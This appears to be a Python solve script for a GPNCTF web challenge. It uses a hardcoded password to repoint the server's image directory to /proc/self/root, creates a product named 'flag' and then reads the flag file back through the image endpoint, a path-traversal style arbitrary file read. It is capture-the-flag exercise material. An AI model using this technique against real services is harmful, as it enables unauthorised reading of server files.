#!/usr/bin/env python3
import re
import sys

import requests


FLAG_RE = re.compile(r"GPNCTF\{[^}]+\}")


def main() -> int:
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <base-url>", file=sys.stderr)
        return 1

    base = sys.argv[1].rstrip("/")
    session = requests.Session()
    session.timeout = 10

    password = "algomaster99"

    r = session.post(
        f"{base}/set-image-dir",
        json={"password": password, "newPath": "/proc/self/root"},
        timeout=10,
    )
    r.raise_for_status()

    product_name = "flag"
    r = session.put(
        f"{base}/products/{product_name}",
        json={
            "product": {
                "name": product_name,
                "quantity": 1,
                "bestBefore": "2026-06-05T00:00:00",
                "notAfter": "2026-06-06T00:00:00",
            },
            "imageUrl": None,
        },
        timeout=10,
    )
    r.raise_for_status()

    r = session.get(f"{base}/images/{product_name}", timeout=10)
    r.raise_for_status()

    match = FLAG_RE.search(r.text)
    if not match:
        print("flag not found", file=sys.stderr)
        print(r.text)
        return 2

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
